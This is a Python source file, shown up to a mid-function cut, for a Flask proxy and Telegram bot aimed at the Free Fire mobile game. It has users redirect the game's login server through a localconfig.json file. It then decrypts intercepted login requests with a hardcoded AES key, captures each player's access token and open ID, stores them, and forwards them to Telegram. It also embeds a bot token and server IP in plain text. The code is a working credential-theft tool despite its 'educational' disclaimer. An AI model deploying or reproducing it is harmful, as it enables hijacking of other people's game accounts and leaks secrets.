from flask import Flask, request, Response
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import threading
import time
import json
import os
import sqlite3
import asyncio
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Telegram Bot
from telegram.constants import ParseMode
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8676375540:AAF0TDHNSLabjidt_XzY0Y52lzIdcZ5HQbc"
REAL_CLIENT_SERVER = "https://clientbp.ggpolarbear.com"
LOCAL_IP = "87.232.72.125"
PORT = 5025

AES_KEY = b"Yg&tc%DEuh6%Zc^8"
AES_IV = b"6oyZDr22E3ychjM%"

OWNER_ID = 8679993003
BOT_USERNAME = "@ff_accessXtoken_bot"
CHANNEL_USERNAME = "@FREEFlRECODE"
DEV_USERNAME = "@FounderOfKrishna"

DB_PATH = "bot_database.db"
TOKEN_JSON_PATH = "tokens.json"

# Maintenance mode
MAINTENANCE_MODE = False

# Thread pool for concurrent tasks
executor = ThreadPoolExecutor(max_workers=20)

sessions = {}
session_lock = threading.Lock()

print("🚀 Starting Proxy + Telegram Bot (Professional Edition)...")

# ================== DATABASE SETUP ==================
def init_database():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            chat_id INTEGER,
            joined_at TEXT,
            is_blocked INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    """)
    
    # Tokens table with UNIQUE constraint
    c.execute("""
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            open_id TEXT,
            access_token TEXT UNIQUE,
            captured_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS broadcasts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            sent_at TEXT,
            total_sent INTEGER
        )
    """)
    
    c.execute("""
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    
    c.execute("CREATE INDEX IF NOT EXISTS idx_tokens_user ON tokens(user_id)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_tokens_access ON tokens(access_token)")
    
    # Insert default maintenance mode
    c.execute("INSERT OR IGNORE INTO config (key, value) VALUES ('maintenance', 'false')")
    
    conn.commit()
    conn.close()

def db_add_user(user_id, username, first_name, chat_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT OR IGNORE INTO users (user_id, username, first_name, chat_id, joined_at)
            VALUES (?, ?, ?, ?, ?)
        """, (user_id, username or "N/A", first_name or "N/A", chat_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit()
        conn.close()
    except:
        pass

def db_get_user(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        return user
    except:
        return None

def db_get_all_users():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM users ORDER BY joined_at DESC")
        users = c.fetchall()
        conn.close()
        return users
    except:
        return []

def db_get_total_users():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 0")
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def db_save_token(user_id, open_id, access_token):
    """Save token only if unique."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT OR IGNORE INTO tokens (user_id, open_id, access_token, captured_at)
            VALUES (?, ?, ?, ?)
        """, (user_id, open_id, access_token, timestamp))
        conn.commit()
        
        if c.rowcount > 0:
            save_token_to_json(user_id, open_id, access_token, timestamp)
            conn.close()
            return True
        conn.close()
        return False
    except:
        return False

def save_token_to_json(user_id, open_id, access_token, timestamp):
    try:
        data = []
        if os.path.exists(TOKEN_JSON_PATH):
            try:
                with open(TOKEN_JSON_PATH, "r") as f:
                    data = json.load(f)
            except:
                data = []
        
        # Check duplicate in JSON too
        for d in data:
            if d.get("access_token") == access_token:
                return
        
        data.append({
            "user_id": user_id,
            "open_id": open_id,
            "access_token": access_token,
            "captured_at": timestamp
        })
        
        with open(TOKEN_JSON_PATH, "w") as f:
            json.dump(data, f, indent=4)
    except:
        pass

def db_get_user_tokens(user_id):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT * FROM tokens WHERE user_id = ? ORDER BY id DESC", (user_id,))
        tokens = c.fetchall()
        conn.close()
        return tokens
    except:
        return []

def db_get_all_tokens():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            SELECT tokens.*, users.username, users.first_name 
            FROM tokens LEFT JOIN users ON tokens.user_id = users.user_id 
            ORDER BY tokens.id DESC
        """)
        tokens = c.fetchall()
        conn.close()
        return tokens
    except:
        return []

def db_get_total_tokens():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM tokens")
        count = c.fetchone()[0]
        conn.close()
        return count
    except:
        return 0

def db_ban_user(user_id, ban=True):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = ? WHERE user_id = ?", (1 if ban else 0, user_id))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def db_save_broadcast(message, total_sent):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("""
            INSERT INTO broadcasts (message, sent_at, total_sent)
            VALUES (?, ?, ?)
        """, (message, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), total_sent))
        conn.commit()
        conn.close()
    except:
        pass

def db_get_maintenance():
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("SELECT value FROM config WHERE key = 'maintenance'")
        row = c.fetchone()
        conn.close()
        return row and row[0] == 'true'
    except:
        return False

def db_set_maintenance(status):
    try:
        conn = sqlite3.connect(DB_PATH, timeout=5)
        c = conn.cursor()
        c.execute("UPDATE config SET value = ? WHERE key = 'maintenance'", ('true' if status else 'false',))
        conn.commit()
        conn.close()
        return True
    except:
        return False

# Initialize DB
init_database()

# Load maintenance mode from DB
MAINTENANCE_MODE = db_get_maintenance()

# ================== DECRYPT FUNCTIONS ==================
def decrypt(data):
    try:
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        decrypted = cipher.decrypt(data)
        return unpad(decrypted, AES.block_size)
    except:
        return None

def decode_login_request(data):
    try:
        decrypted = decrypt(data)
        if decrypted is None:
            return None

        import MajorLoginReq_pb2
        msg = MajorLoginReq_pb2.MajorLogin()
        msg.ParseFromString(decrypted)
        
        return {
            "open_id": msg.open_id,
            "access_token": msg.access_token,
        }
    except:
        return None

def send_to_telegram(chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

# ================== PROXY ==================
def proxy_request(real_url, endpoint, tg_user_id=None):
    req_data = request.get_data()

    if 'GetLoginData' in endpoint:
        decoded = decode_login_request(req_data)
        if decoded:
            access_token = decoded.get("access_token", "")
            open_id = decoded.get("open_id", "")
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if tg_user_id and tg_user_id in sessions:
                with session_lock:
                    sessions[tg_user_id]["tokens"].append({
                        "open_id": open_id,
                        "access_token": access_token,
                        "time": timestamp
                    })
                
                try:
                    uid_int = int(tg_user_id)
                    is_new = db_save_token(uid_int, open_id, access_token)
                except:
                    pass

            if tg_user_id and tg_user_id in sessions:
                chat_id = sessions[tg_user_id]["chat_id"]
                tg_message = f"""
🔥 <b>ɴᴇᴡ ʟᴏɢɪɴ ᴄᴀᴘᴛᴜʀᴇᴅ!</b>

👤 <b>ᴏᴘᴇɴ ɪᴅ</b>
<code>{open_id}</code>

🔑 <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b>
<code>{access_token}</code>

🕒 <b>ᴄᴀᴘᴛᴜʀᴇᴅ ᴏɴ</b>
<i>{timestamp}</i>

━━━━━━━━━━━━━━━━━━━━━
👨‍💻 <i><b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴋʀɪsʜɴᴀ ᴄᴏᴅᴇʀ</b></i>
                """.strip()
                executor.submit(send_to_telegram, chat_id, tg_message)

            message = f"[ffffff][b][c][I]Open ID: [00ff00]{open_id}\n\n[ffffff][b][c][I]Access Token: [00ff00]{access_token}\n\n[00ff00][b][c][I]Developed by KrishnaCoder"
            return Response(message.encode('utf-8'), 500)
    
    try:
        resp = requests.request(
            method=request.method,
            url=real_url,
            headers={key: value for key, value in request.headers if key.lower() != 'host'},
            data=req_data,
            cookies=request.cookies,
            allow_redirects=False,
            stream=True,
            timeout=8
        )

        return Response(resp.content, resp.status_code, 
                        [(name, value) for (name, value) in resp.raw.headers.items() 
                         if name.lower() not in ['content-encoding', 'transfer-encoding', 'connection']])
    except requests.exceptions.Timeout:
        return Response("Gateway Timeout", 504)
    except:
        return Response("Bad Gateway", 502)

# ================== FLASK ROUTES ==================
@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
@app.route('/<path:path>', methods=['POST', 'GET'])
def catch_all(path):
    if not path:
        return "OK", 200

    parts = path.split('/', 1)
    tg_user_id = parts[0]
    sub_path = parts[1] if len(parts) > 1 else ""
    
    real_url = f'{REAL_CLIENT_SERVER}/{sub_path}'
    return proxy_request(real_url, sub_path or path, tg_user_id)

@app.route('/<tg_user_id>/', methods=['GET'])
def session_info(tg_user_id):
    if tg_user_id in sessions:
        link = f"http://{LOCAL_IP}:{PORT}/{tg_user_id}/"
        return (
            f"<b>✅ sᴇʀᴠᴇʀ ᴀᴄᴛɪᴠᴇ</b><br>"
            f"<b>sᴇʀᴠᴇʀ ᴜʀʟ:</b> <code>{link}</code><br><br>"
            f"👨‍💻 <b>ᴍᴀᴅᴇ ʙʏ</b> <code>ᴋʀɪsʜɴᴀ ᴄᴏᴅᴇʀ</code>"
        ), 200
    return (
        "<b>❌ sᴇʀᴠᴇʀ ɴᴏᴛ ꜰᴏᴜɴᴅ.</b><br><br>"
        "<b>ᴘʟᴇᴀsᴇ ᴏᴘᴇɴ ᴛʜᴇ ᴛᴇʟᴇɢʀᴀᴍ ʙᴏᴛ, ᴘʀᴇss <b>🔗 ᴄʀᴇᴀᴛᴇ ᴜʀʟ</b>, "
        "ᴀɴᴅ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇʀᴠᴇʀ ᴜʀʟ ꜰɪʀsᴛ.</b><br><br>"
        "👨‍💻 <b>ᴍᴀᴅᴇ ʙʏ</b> <code>ᴋʀɪsʜɴᴀ ᴄᴏᴅᴇʀ</code>"
    ), 404

# ================== HELPER: GET KEYBOARD ==================
def get_user_keyboard(user_id):
    keyboard = [
        [KeyboardButton("ᴄʀᴇᴀᴛᴇ ᴜʀʟ"), KeyboardButton("ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ")],
        [KeyboardButton(f"👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ")]
    ]
    
    if user_id == OWNER_ID:
        keyboard.append([KeyboardButton("🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ")])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ================== TELEGRAM COMMANDS ==================
async def check_subscription(user_id, context):
    try:
        chat_member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return chat_member.status in ["member", "administrator", "creator"]
    except:
        return False

async def force_join_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(" ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(" ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"<b>⚠️ ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ ꜰɪʀsᴛ!</b>\n\n"
        f"<i>ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴏᴜʀ ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ.</i>\n\n"
        f"📢 <b>ᴄʜᴀɴɴᴇʟ:</b> {CHANNEL_USERNAME}\n\n"
        f"<i>ᴀꜰᴛᴇʀ ᴊᴏɪɴɪɴɢ, ᴄʟɪᴄᴋ <b>✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ</b> ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</i>",
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    chat_id = update.effective_chat.id
    
    # Check maintenance mode first
    global MAINTENANCE_MODE
    if MAINTENANCE_MODE and user_id != OWNER_ID:
        await update.message.reply_text(
"🔧 <b>ʙᴏᴛ ɪꜱ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ!</b>\n\n"
"ᴛʜᴇ ʙᴏᴛ ɪꜱ ᴄᴜʀʀᴇɴᴛʟʏ ʙᴇɪɴɢ ᴜᴘᴅᴀᴛᴇᴅ. ᴘʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.\n\n"
"ꜰᴏʀ ᴜᴘᴅᴀᴛᴇꜱ & ꜱᴜᴘᴘᴏʀᴛ, ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ: @FREEFlRECODE",
            parse_mode="HTML"
        )
        return
    
    # Check if user is banned
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        await update.message.reply_text(
"🚫 <b>ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n\n"
"ʏᴏᴜʀ ᴀᴄᴄᴇꜱꜱ ᴛᴏ ᴛʜɪꜱ ʙᴏᴛ ʜᴀꜱ ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ.\n"
"ɪꜰ ʏᴏᴜ ʙᴇʟɪᴇᴠᴇ ᴛʜɪꜱ ɪꜱ ᴀ ᴍɪꜱᴛᴀᴋᴇ, ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴀᴅᴍɪɴ @FounderOfKrishna"
        )
        return
    
    # Force join check
    is_member = await check_subscription(user_id, context)
    if not is_member:
        await force_join_prompt(update, context)
        return
    
    # Add user to database
    db_add_user(user_id, username, first_name, chat_id)
    
    # Initialize session
    with session_lock:
        sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
    
    welcome_text = (
        f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {first_name}!</b>\n\n"
        f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
        f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
        f"<i>ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ ᴠɪᴇᴡ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ɢᴀᴍᴇ ʟᴏɢɪɴ.</i>\n\n"
        f"📌 <b>ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n"
        f"• ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ <b>ᴘʀᴏxʏ ᴜʀʟ</b>.\n"
        f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ ɪɴsᴛʀᴜᴄᴛɪᴏɴs ᴛᴏ sᴇᴛ ᴜᴘ <code>localconfig.json</code>.\n"
        f"• ʟᴏɢ ɪɴ ᴛᴏ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>.\n"
        f"• ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴛᴏᴋᴇɴ.\n\n"
        f"⚠️ <b>ᴘʀᴇᴄᴀᴜᴛɪᴏɴ</b>\n"
        f"<i>ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴏʀ ᴘʀᴏxʏ ᴜʀʟ ᴡɪᴛʜ ᴀɴʏᴏɴᴇ. ᴋᴇᴇᴘ ɪᴛ ᴘʀɪᴠᴀᴛᴇ.</i>\n\n"
        f"📜 <b>ᴅɪsᴄʟᴀɪᴍᴇʀ</b>\n"
        f"<i>ᴛʜɪs ʙᴏᴛ ɪs ᴘʀᴏᴠɪᴅᴇᴅ ꜰᴏʀ ᴇᴅᴜᴄᴀᴛɪᴏɴᴀʟ ᴀɴᴅ ᴛᴇsᴛɪɴɢ ᴘᴜʀᴘᴏsᴇs. ᴜsᴇ ɪᴛ ʀᴇsᴘᴏɴsɪʙʟʏ ᴀɴᴅ ᴏɴʟʏ ᴡɪᴛʜ ᴀᴄᴄᴏᴜɴᴛs ʏᴏᴜ ᴀʀᴇ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴄᴄᴇss.</i>\n\n"
        f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> {DEV_USERNAME}"
    )
    
    await update.message.reply_html(welcome_text, reply_markup=get_user_keyboard(user_id))

async def check_joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    
    is_member = await check_subscription(user_id, context)
    
    if is_member:
        db_add_user(user_id, query.from_user.username, query.from_user.first_name, chat_id)
        with session_lock:
            sessions[str(user_id)] = {"chat_id": chat_id, "tokens": []}
        
        await query.message.delete()
        
        welcome_text = (
            f"🎉 <b>ᴡᴇʟᴄᴏᴍᴇ, {query.from_user.first_name}!</b>\n\n"
            f"✅ <b>ʏᴏᴜʀ sᴇssɪᴏɴ ʜᴀs ʙᴇᴇɴ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ.</b>\n\n"
            f"🤖 <b>ᴀʙᴏᴜᴛ ᴛʜɪs ʙᴏᴛ</b>\n"
            f"<i>ᴛʜɪs ʙᴏᴛ ʜᴇʟᴘs ʏᴏᴜ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ᴘʀᴏxʏ ᴜʀʟ, sᴇᴛ ᴜᴘ <code>localconfig.json</code>, ᴀɴᴅ ᴠɪᴇᴡ ʏᴏᴜʀ ᴄᴀᴘᴛᴜʀᴇᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴs.</i>\n\n"
            f"📌 <b>ɢᴇᴛ sᴛᴀʀᴛᴇᴅ</b>\n"
            f"• ᴘʀᴇss <b>🔗 ᴄʀᴇᴀᴛᴇ ᴜʀʟ</b> ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʏᴏᴜʀ sᴇʀᴠᴇʀ ᴜʀʟ.\n"
            f"• ꜰᴏʟʟᴏᴡ ᴛʜᴇ sᴇᴛᴜᴘ ɪɴsᴛʀᴜᴄᴛɪᴏɴs.\n"
            f"• ʟᴏɢ ɪɴ ᴛᴏ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴏʀ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>.\n"
            f"• ʀᴇᴛᴜʀɴ ʜᴇʀᴇ ᴀɴᴅ ᴘʀᴇss <b>📥 ᴄʜᴇᴄᴋ ᴛᴏᴋᴇɴ</b>.\n\n"
            f"⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴋᴇᴇᴘ ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴘʀɪᴠᴀᴛᴇ. ᴅᴏ ɴᴏᴛ sʜᴀʀᴇ ᴛʜᴇᴍ ᴡɪᴛʜ ᴏᴛʜᴇʀs.</i>\n\n"
            f"👨‍💻 <b>ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ</b> {DEV_USERNAME}"
        )
        
        await context.bot.send_message(
            chat_id=chat_id,
            text=welcome_text,
            parse_mode="HTML",
            reply_markup=get_user_keyboard(user_id)
        )
    else:
        keyboard = [
            [InlineKeyboardButton(" ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(" ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ", callback_data="check_joined")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.reply_text(
            f"<b>⚠️ ʏᴏᴜ ʜᴀᴠᴇɴ'ᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ!</b>\n\n"
            f"<i>ᴘʟᴇᴀsᴇ ᴊᴏɪɴ <b>{CHANNEL_USERNAME}</b> ꜰɪʀsᴛ, ᴛʜᴇɴ ᴄʟɪᴄᴋ <b>✅ ɪ'ᴠᴇ ᴊᴏɪɴᴇᴅ</b> ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</i>",
            parse_mode="HTML",
            reply_markup=reply_markup
        )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Check maintenance mode
    global MAINTENANCE_MODE
    if MAINTENANCE_MODE and user_id != OWNER_ID:
        await update.message.reply_text(
            "🔧 <b>Bot is under maintenance!</b>\n\n"
            "The bot is currently being updated. Please try again later.\n\n"
            f"For support, contact: {DEV_USERNAME}",
            parse_mode="HTML"
        )
        return
    
    # Check subscription
    is_member = await check_subscription(user_id, context)
    if not is_member:
        await force_join_prompt(update, context)
        return
    
    # Check if user is banned
    user_data = db_get_user(user_id)
    if user_data and user_data[6] == 1:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    if text == "ᴄʀᴇᴀᴛᴇ ᴜʀʟ":
        with session_lock:
            if str(user_id) not in sessions:
                sessions[str(user_id)] = {"chat_id": update.effective_chat.id, "tokens": []}
        
        link = f"http://{LOCAL_IP}:{PORT}/{user_id}/"
        config_data = {"serverLoginUrl": link}
        config_json_str = json.dumps(config_data, indent=2)
        
        msg = (
            f"<b>🔗 ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ sᴇʀᴠᴇʀ ᴜʀʟ</b>\n\n"
            f"<code>{link}</code>\n\n"
            f"<b>📋 ʜᴏᴡ ᴛᴏ ᴜsᴇ</b>\n\n"
            f"1. ᴄᴏᴘʏ ᴛʜᴇ <b>sᴇʀᴠᴇʀ ᴜʀʟ</b> ᴀʙᴏᴠᴇ.\n\n"
            f"2. ɢᴏ ᴛᴏ ᴛʜᴇ ꜰᴏʟʟᴏᴡɪɴɢ ᴅɪʀᴇᴄᴛᴏʀʏ:\n"
            f"<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n\n"
            f"3. ᴄʀᴇᴀᴛᴇ ᴀ ꜰɪʟᴇ ɴᴀᴍᴇᴅ <code>localconfig.json</code>.\n\n"
            f"4. ᴘᴀsᴛᴇ ᴛʜᴇ ꜰᴏʟʟᴏᴡɪɴɢ ᴄᴏɴᴛᴇɴᴛ ɪɴᴛᴏ ᴛʜᴇ ꜰɪʟᴇ:\n"
            f"<pre>{config_json_str}</pre>\n\n"
            f"5. sᴀᴠᴇ ᴛʜᴇ ꜰɪʟᴇ.\n\n"
            f"6. ᴏᴘᴇɴ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> & <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b> ᴀɴᴅ ʟᴏɢ ɪɴ ᴛᴏ ᴛʜᴇ ᴀᴄᴄᴏᴜɴᴛ ᴡʜᴏsᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ.\n\n"
            f"7. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ. ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ʟᴏɢɪɴ.\n\n"
            f"⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴀɴᴅ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>. ᴅᴍ <b>@FounderOfKrishna</b> ꜰᴏʀ ɪssᴜᴇs.</i>"
        )
        
        await update.message.reply_html(msg)
        
        config_filename = f"localconfig_{user_id}.json"
        try:
            with open(config_filename, "w") as f:
                json.dump(config_data, f, indent=4)
            
            with open(config_filename, "rb") as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=f,
                    filename="localconfig.json",
                    caption=(
    "📂 <b>ᴘʟᴀᴄᴇ ᴛʜɪs ꜰɪʟᴇ ɪɴ ʏᴏᴜʀ ɢᴀᴍᴇ ᴅɪʀᴇᴄᴛᴏʀʏ</b>\n\n"
    "<b>ʜᴏᴡ ᴛᴏ ᴜsᴇ:</b>\n"
    "1. ᴅᴏᴡɴʟᴏᴀᴅ ᴛʜᴇ ꜰɪʟᴇ.\n"
    "2. ᴏᴘᴇɴ ᴛʜᴇ ꜰᴏʟᴅᴇʀ ᴡʜᴇʀᴇ ᴛʜᴇ ꜰɪʟᴇ ᴡᴀs ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ.\n"
    "3. ᴄᴏᴘʏ ᴛʜᴇ ꜰɪʟᴇ.\n"
    "4. ᴏᴘᴇɴ:\n"
    "<code>/storage/emulated/0/Android/data/com.dts.freefiremax/files/</code>\n"
    "5. ᴘᴀsᴛᴇ ᴛʜᴇ ꜰɪʟᴇ ɪɴᴛᴏ ᴛʜɪs ꜰᴏʟᴅᴇʀ.\n"
    "6. ᴏᴘᴇɴ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> & <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b> ᴀɴᴅ ʟᴏɢ ɪɴ ᴛᴏ ᴛʜᴇ ᴀᴄᴄᴏᴜɴᴛ ᴡʜᴏsᴇ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴄᴀᴘᴛᴜʀᴇ.\n"
    "7. ʀᴇᴛᴜʀɴ ᴛᴏ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ. ɪᴛ ᴡɪʟʟ ʙᴇ ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ ᴀꜰᴛᴇʀ ᴀ sᴜᴄᴄᴇssꜰᴜʟ ʟᴏɢɪɴ.\n\n"
    "⚠️ <b>ɴᴏᴛᴇ:</b> <i>ᴛʜɪs ᴍᴇᴛʜᴏᴅ ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ <b>ꜰʀᴇᴇ ꜰɪʀᴇ</b> ᴀɴᴅ <b>ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx</b>. ɪꜰ ʏᴏᴜ ꜰᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴅᴍ <b>@FounderOfKrishna</b>.</i>"
                    ),
                    parse_mode="HTML"
                )                    
            
            os.remove(config_filename)
        except:
            pass
    
    elif text == "ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ":
        tokens = db_get_user_tokens(user_id)
        
        if not tokens:
            await update.message.reply_html(
